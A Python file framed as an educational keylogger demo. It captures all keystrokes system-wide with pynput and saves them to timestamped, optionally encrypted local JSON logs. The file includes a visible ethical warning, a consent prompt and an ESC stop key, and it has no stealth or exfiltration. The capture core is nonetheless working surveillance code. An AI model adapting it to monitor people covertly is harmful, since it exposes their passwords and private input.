"""
Educational Keylogger Module
============================

WARNING: This module is for EDUCATIONAL PURPOSES ONLY.
It demonstrates how keyloggers work for learning about:
- Input monitoring
- File I/O operations
- System process management
- Encryption concepts

DO NOT use this code for malicious purposes or to monitor others without consent.
Always respect privacy and follow applicable laws.

Author: Educational Project
License: MIT
"""

import os
import time
import json
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, Any

try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
    import psutil
    from cryptography.fernet import Fernet
    from colorama import init, Fore, Style
except ImportError as e:
    print(f"Missing required dependency: {e}")
    print("Please install requirements: pip install -r requirements.txt")
    exit(1)

# Initialize colorama for colored output
init(autoreset=True)

class EducationalKeylogger:
    """
    Educational Keylogger Class
    
    This class demonstrates keylogging concepts for educational purposes.
    It includes ethical safeguards and should only be used for learning.
    """
    
    def __init__(self, log_dir: str = "logs", encrypt_logs: bool = True):
        """
        Initialize the educational keylogger.
        
        Args:
            log_dir: Directory to store log files
            encrypt_logs: Whether to encrypt log files (recommended)
        """
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(exist_ok=True)
        
        self.encrypt_logs = encrypt_logs
        self.encryption_key = None
        self.fernet = None
        
        if self.encrypt_logs:
            self._setup_encryption()
        
        self.is_running = False
        self.key_count = 0
        self.start_time = None
        
        # Ethical safeguards
        self._display_ethical_warning()
        self._require_consent()
    
    def _setup_encryption(self):
        """Setup encryption for log files."""
        try:
            key_file = self.log_dir / "encryption.key"
            if key_file.exists():
                with open(key_file, "rb") as f:
                    self.encryption_key = f.read()
            else:
                self.encryption_key = Fernet.generate_key()
                with open(key_file, "wb") as f:
                    f.write(self.encryption_key)
            
            self.fernet = Fernet(self.encryption_key)
            print(f"{Fore.GREEN}✓ Encryption setup complete{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}✗ Encryption setup failed: {e}{Style.RESET_ALL}")
            self.encrypt_logs = False
    
    def _display_ethical_warning(self):
        """Display ethical warning and usage guidelines."""
        warning = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║                    ETHICAL WARNING                                    ║
╠══════════════════════════════════════════════════════════════╣
║  This tool is for EDUCATIONAL PURPOSES ONLY!                ║
║                                                              ║
║  DO NOT use this code to:                                   ║
║  • Monitor others without consent                           ║
║  • Steal passwords or sensitive information                 ║
║  • Violate privacy or laws                                  ║
║                                                              ║
║  ONLY use this for:                                         ║
║  • Learning about system programming                        ║
║  • Understanding input monitoring                           ║
║  • Educational research                                     ║
║                                                              ║
║  By using this tool, you agree to use it ethically         ║
║  and legally.                                               ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(warning)
    
    def _require_consent(self):
        """Require explicit consent before proceeding."""
        print(f"{Fore.YELLOW}Do you understand and agree to use this tool ethically? (yes/no){Style.RESET_ALL}")
        response = input().lower().strip()
        
        if response not in ['yes', 'y']:
            print(f"{Fore.RED}Consent not given. Exiting.{Style.RESET_ALL}")
            exit(0)
        
        print(f"{Fore.GREEN}Consent confirmed. Proceeding with educational demonstration.{Style.RESET_ALL}")
    
    def _on_key_press(self, key):
        """Handle key press events."""
        try:
            # Convert key to string representation
            if hasattr(key, 'char'):
                key_str = key.char
            elif key == Key.space:
                key_str = ' '
            elif key == Key.enter:
                key_str = '\n'
            elif key == Key.backspace:
                key_str = '[BACKSPACE]'
            elif key == Key.tab:
                key_str = '[TAB]'
            elif key == Key.esc:
                key_str = '[ESC]'
            else:
                key_str = str(key)
            
            # Log the key press
            self._log_key_event('press', key_str)
            self.key_count += 1
            
            # Display real-time feedback
            if self.key_count % 10 == 0:
                print(f"{Fore.CYAN}Keys logged: {self.key_count}{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}Error processing key press: {e}{Style.RESET_ALL}")
    
    def _on_key_release(self, key):
        """Handle key release events."""
        try:
            if key == Key.esc:
                print(f"{Fore.YELLOW}ESC key pressed. Stopping keylogger...{Style.RESET_ALL}")
                self.stop()
                return False
        except Exception as e:
            print(f"{Fore.RED}Error processing key release: {e}{Style.RESET_ALL}")
    
    def _log_key_event(self, event_type: str, key_data: str):
        """Log key events to file."""
        try:
            timestamp = datetime.now().isoformat()
            log_entry = {
                'timestamp': timestamp,
                'event_type': event_type,
                'key': key_data,
                'process': self._get_active_process()
            }
            
            # Create log filename with date
            date_str = datetime.now().strftime("%Y-%m-%d")
            log_file = self.log_dir / f"keylog_{date_str}.json"
            
            # Read existing logs or create new
            logs = []
            if log_file.exists():
                try:
                    with open(log_file, 'r', encoding='utf-8') as f:
                        logs = json.load(f)
                except (json.JSONDecodeError, UnicodeDecodeError):
                    logs = []
            
            logs.append(log_entry)
            
            # Write logs (encrypted if enabled)
            if self.encrypt_logs and self.fernet:
                encrypted_data = self.fernet.encrypt(json.dumps(logs, ensure_ascii=False).encode())
                with open(log_file, 'wb') as f:
                    f.write(encrypted_data)
            else:
                with open(log_file, 'w', encoding='utf-8') as f:
                    json.dump(logs, f, ensure_ascii=False, indent=2)
                    
        except Exception as e:
            print(f"{Fore.RED}Error logging key event: {e}{Style.RESET_ALL}")
    
    def _get_active_process(self) -> str:
        """Get the currently active process name."""
        try:
            # This is a simplified approach for educational purposes
            # In a real scenario, you'd need more sophisticated process detection
            return "Educational Demo"
        except Exception:
            return "Unknown"
    
    def start(self):
        """Start the educational keylogger."""
        if self.is_running:
            print(f"{Fore.YELLOW}Keylogger is already running.{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}Starting educational keylogger...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Press ESC to stop{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Logs will be saved to: {self.log_dir}{Style.RESET_ALL}")
        
        self.is_running = True
        self.start_time = datetime.now()
        
        try:
            with keyboard.Listener(
                on_press=self._on_key_press,
                on_release=self._on_key_release
            ) as listener:
                listener.join()
        except Exception as e:
            print(f"{Fore.RED}Error starting keylogger: {e}{Style.RESET_ALL}")
            self.is_running = False
    
    def stop(self):
        """Stop the keylogger and display summary."""
        if not self.is_running:
            return
        
        self.is_running = False
        end_time = datetime.now()
        duration = end_time - self.start_time if self.start_time else None
        
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.GREEN}║                    SESSION SUMMARY                              ║{Style.RESET_ALL}")
        print(f"{Fore.GREEN}╠══════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
        print(f"{Fore.GREEN}║  Total keys logged: {self.key_count:>35} ║{Style.RESET_ALL}")
        if duration:
            print(f"{Fore.GREEN}║  Session duration: {str(duration).split('.')[0]:>35} ║{Style.RESET_ALL}")
        print(f"{Fore.GREEN}║  Log directory: {str(self.log_dir):>35} ║{Style.RESET_ALL}")
        print(f"{Fore.GREEN}║  Encryption: {'Enabled' if self.encrypt_logs else 'Disabled':>35} ║{Style.RESET_ALL}")
        print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Remember: This tool is for educational purposes only!{Style.RESET_ALL}")
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get current statistics about the keylogger session."""
        return {
            'is_running': self.is_running,
            'key_count': self.key_count,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'log_directory': str(self.log_dir),
            'encryption_enabled': self.encrypt_logs
        }


def main():
    """Main function to demonstrate the educational keylogger."""
    print(f"{Fore.CYAN}Educational Keylogger Demo{Style.RESET_ALL}")
    print(f"{Fore.CYAN}=========================={Style.RESET_ALL}")
    
    # Create and start the keylogger
    keylogger = EducationalKeylogger()
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Interrupted by user{Style.RESET_ALL}")
    finally:
        keylogger.stop()


if __name__ == "__main__":
    main()
